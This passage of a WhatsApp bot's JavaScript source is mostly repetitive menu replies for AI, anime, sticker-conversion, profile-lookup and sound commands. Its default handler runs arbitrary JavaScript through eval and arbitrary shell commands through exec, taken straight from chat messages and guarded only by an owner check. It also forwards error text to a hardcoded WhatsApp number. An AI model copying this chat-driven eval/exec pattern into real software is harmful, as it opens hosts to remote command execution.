        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'aimenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *A I* 」
│ ‣ ${prefix}ai *<text>*
│ ‣ ${prefix}jadianime
│ ‣ ${prefix}remini
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu8.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'genshinmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *G E N S H I N* 」
│ ‣ ${prefix}enka *<uid>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'gamemenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *G A M E S* 」
│ ‣ ${prefix}tebak gambar
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'infomenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *I N F O R M A T I O N* 」
│ ‣ ${prefix}kbbi
│ ‣ ${prefix}brainly
│ ‣ ${prefix}roboguru
│ ‣ ${prefix}jarak
│ ‣ ${prefix}wikipedia
│ ‣ ${prefix}translate
│ ‣ ${prefix}jadwaltv
│ ‣ ${prefix}jadwaltvnow
│ ‣ ${prefix}jadwalbola
│ ‣ ${prefix}newsinfo
│ ‣ ${prefix}cnnindonesia
│ ‣ ${prefix}cnnnasional
│ ‣ ${prefix}cnninternasional
│ ‣ ${prefix}infogempa
│ ‣ ${prefix}infocuaca
│ ‣ ${prefix}lirik
│ ‣ ${prefix}kodepos
│ ‣ ${prefix}infochat
│ ‣ ${prefix}google
│ ‣ ${prefix}gimage
│ ‣ ${prefix}pinterest
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu11.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'animemenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *A N I M E* 」
│ ‣ ${prefix}cosplay
│ ‣ ${prefix}genshin
│ ‣ ${prefix}yotsuba
│ ‣ ${prefix}shinomiya
│ ‣ ${prefix}yumeko
│ ‣ ${prefix}tejina
│ ‣ ${prefix}chiho
│ ‣ ${prefix}boruto
│ ‣ ${prefix}kaori
│ ‣ ${prefix}shizuka
│ ‣ ${prefix}kaga
│ ‣ ${prefix}gremory
│ ‣ ${prefix}kagura
│ ‣ ${prefix}hinata
│ ‣ ${prefix}minato
│ ‣ ${prefix}naruto
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}anna
│ ‣ ${prefix}deidara
│ ‣ ${prefix}yuki
│ ‣ ${prefix}asuna
│ ‣ ${prefix}chitoge
│ ‣ ${prefix}emilia
│ ‣ ${prefix}inori
│ ‣ ${prefix}madara
│ ‣ ${prefix}sasuke
│ ‣ ${prefix}one piece
│ ‣ ${prefix}kotori
│ ‣ ${prefix}mikasa
│ ‣ ${prefix}akiyama
│ ‣ ${prefix}shine
│ ‣ ${prefix}shinka
│ ‣ ${prefix}elaina
│ ‣ ${prefix}nezuko
│ ‣ ${prefix}rize
│ ‣ ${prefix}anna
│ ‣ ${prefix}ayuzawa
│ ‣ ${prefix}hestia
│ ‣ ${prefix}Itachi
│ ‣ ${prefix}sakura
│ ‣ ${prefix}tsunade
│ ‣ ${prefix}kencki
│ ‣ ${prefix}toukachan
│ ‣ ${prefix}akira
│ ‣ ${prefix}itori
│ ‣ ${prefix}kurumi
│ ‣ ${prefix}miku
│ ‣ ${prefix}pokemon
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu15.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'convertmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *C O N V E R T* 」
│ ‣ ${prefix}stiker
│ ‣ ${prefix}swm
│ ‣ ${prefix}smeme
│ ‣ ${prefix}emojimix
│ ‣ ${prefix}emojimix2
│ ‣ ${prefix}toimage
│ ‣ ${prefix}tomp4
│ ‣ ${prefix}toaudio
│ ‣ ${prefix}tomp3
│ ‣ ${prefix}tovn
│ ‣ ${prefix}togif
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu13.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'stalkmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *S T A L K E R* 」
│ ‣ ${prefix}enka
│ ‣ ${prefix}igstalk
│ ‣ ${prefix}ttstalk
│ ‣ ${prefix}mlstalk
│ ‣ ${prefix}ghstalk
│ ‣ ${prefix}twstalk
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'soundmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *S O U N D* 」
│ ‣ ${prefix}sound1
│ ‣ ${prefix}sound2
│ ‣ ${prefix}sound3
│ ‣ ${prefix}sound4
│ ‣ ${prefix}sound5
│ ‣ ${prefix}sound6
│ ‣ ${prefix}sound7
│ ‣ ${prefix}sound8
│ ‣ ${prefix}sound9
│ ‣ ${prefix}sound10
│ ‣ ${prefix}sound11
│ ‣ ${prefix}sound12
│ ‣ ${prefix}sound13
│ ‣ ${prefix}sound14
│ ‣ ${prefix}sound15
│ ‣ ${prefix}sound16
│ ‣ ${prefix}sound17
│ ‣ ${prefix}sound18
│ ‣ ${prefix}sound19
│ ‣ ${prefix}sound20
│ ‣ ${prefix}sound21
│ ‣ ${prefix}sound22
│ ‣ ${prefix}sound23
│ ‣ ${prefix}sound24
│ ‣ ${prefix}sound25
│ ‣ ${prefix}sound26
│ ‣ ${prefix}sound27
│ ‣ ${prefix}sound28
│ ‣ ${prefix}sound29
│ ‣ ${prefix}sound30
│ ‣ ${prefix}sound31
│ ‣ ${prefix}sound32
│ ‣ ${prefix}sound33
│ ‣ ${prefix}sound34
│ ‣ ${prefix}sound35
│ ‣ ${prefix}sound36
│ ‣ ${prefix}sound37
│ ‣ ${prefix}sound38
│ ‣ ${prefix}sound39
│ ‣ ${prefix}sound40
│ ‣ ${prefix}sound41
│ ‣ ${prefix}sound42
│ ‣ ${prefix}sound43
│ ‣ ${prefix}sound44
│ ‣ ${prefix}sound45
│ ‣ ${prefix}sound46
│ ‣ ${prefix}sound47
│ ‣ ${prefix}sound48
│ ‣ ${prefix}sound49
│ ‣ ${prefix}sound50
│ ‣ ${prefix}sound51
│ ‣ ${prefix}sound52
│ ‣ ${prefix}sound53
│ ‣ ${prefix}sound54
│ ‣ ${prefix}sound55
│ ‣ ${prefix}sound56
│ ‣ ${prefix}sound57
│ ‣ ${prefix}sound58
│ ‣ ${prefix}sound59
│ ‣ ${prefix}sound60
│ ‣ ${prefix}sound61
│ ‣ ${prefix}sound62
│ ‣ ${prefix}sound63
│ ‣ ${prefix}sound64
│ ‣ ${prefix}sound65
│ ‣ ${prefix}sound66
│ ‣ ${prefix}sound67
│ ‣ ${prefix}sound68
│ ‣ ${prefix}sound69
│ ‣ ${prefix}sound70
│ ‣ ${prefix}sound71
│ ‣ ${prefix}sound72
│ ‣ ${prefix}sound73
│ ‣ ${prefix}sound74
│ ‣ ${prefix}sound75
│ ‣ ${prefix}sound76
│ ‣ ${prefix}sound77
│ ‣ ${prefix}sound78
│ ‣ ${prefix}sound79
│ ‣ ${prefix}sound80
│ ‣ ${prefix}sound81
│ ‣ ${prefix}sound82
│ ‣ ${prefix}sound83
│ ‣ ${prefix}sound84
│ ‣ ${prefix}sound85
│ ‣ ${prefix}sound86
│ ‣ ${prefix}sound87
│ ‣ ${prefix}sound88
│ ‣ ${prefix}sound89
│ ‣ ${prefix}sound90
│ ‣ ${prefix}sound91
│ ‣ ${prefix}sound92
│ ‣ ${prefix}sound93
│ ‣ ${prefix}sound94
│ ‣ ${prefix}sound95
│ ‣ ${prefix}sound96
│ ‣ ${prefix}sound97
│ ‣ ${prefix}sound98
│ ‣ ${prefix}sound99
│ ‣ ${prefix}sound100
│ ‣ ${prefix}sound101
│ ‣ ${prefix}sound102
│ ‣ ${prefix}sound103
│ ‣ ${prefix}sound104
│ ‣ ${prefix}sound105
│ ‣ ${prefix}sound106
│ ‣ ${prefix}sound107
│ ‣ ${prefix}sound108
│ ‣ ${prefix}sound109
│ ‣ ${prefix}sound110
│ ‣ ${prefix}sound111
│ ‣ ${prefix}sound112
│ ‣ ${prefix}sound113
│ ‣ ${prefix}sound114
│ ‣ ${prefix}sound115
│ ‣ ${prefix}sound116
│ ‣ ${prefix}sound117
│ ‣ ${prefix}sound118
│ ‣ ${prefix}sound119
│ ‣ ${prefix}sound120
│ ‣ ${prefix}sound121
│ ‣ ${prefix}sound122
│ ‣ ${prefix}sound123
│ ‣ ${prefix}sound124
│ ‣ ${prefix}sound125
│ ‣ ${prefix}sound126
│ ‣ ${prefix}sound127
│ ‣ ${prefix}sound128
│ ‣ ${prefix}sound129
│ ‣ ${prefix}sound130
│ ‣ ${prefix}sound131
│ ‣ ${prefix}sound132
│ ‣ ${prefix}sound133
│ ‣ ${prefix}sound134
│ ‣ ${prefix}sound135
│ ‣ ${prefix}sound136
│ ‣ ${prefix}sound137
│ ‣ ${prefix}sound138
│ ‣ ${prefix}sound139
│ ‣ ${prefix}sound140
│ ‣ ${prefix}sound141
│ ‣ ${prefix}sound142
│ ‣ ${prefix}sound143
│ ‣ ${prefix}sound144
│ ‣ ${prefix}sound145
│ ‣ ${prefix}sound146
│ ‣ ${prefix}sound147
│ ‣ ${prefix}sound148
│ ‣ ${prefix}sound149
│ ‣ ${prefix}sound150
│ ‣ ${prefix}sound151
│ ‣ ${prefix}sound152
│ ‣ ${prefix}sound153
│ ‣ ${prefix}sound154
│ ‣ ${prefix}sound155
│ ‣ ${prefix}sound156
│ ‣ ${prefix}sound157
│ ‣ ${prefix}sound158
│ ‣ ${prefix}sound159
│ ‣ ${prefix}sound160
│ ‣ ${prefix}sound161
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'mememenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *M E M E* 」
│ ‣ ${prefix}darkjoke
│ ‣ ${prefix}memeindo
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu6.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
            default:
                
                if (!isCmd) {
                    if (command)
                    newReply("Jangan Spam Cok !!!")
                await sleep(5000)
                }
                
                if (budy.startsWith('=>')) {
                    if (!isCreator) return newReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return newReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return newReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
                
                if (isCmd && budy.toLowerCase() != undefined) {
                    if (m.chat.endsWith('broadcast')) return
                    if (m.isBaileys) return
                    let msgs = global.db.data.database
                    if (!(budy.toLowerCase() in msgs)) return
                    conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
                }
        }


    } catch (err) {
console.log(util.format(err))
let e = String(err)
conn.sendMessage("687909002@s.whatsapp.net", { text: "👋🏻 Hello developer, ada yang error nih! di bagian " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})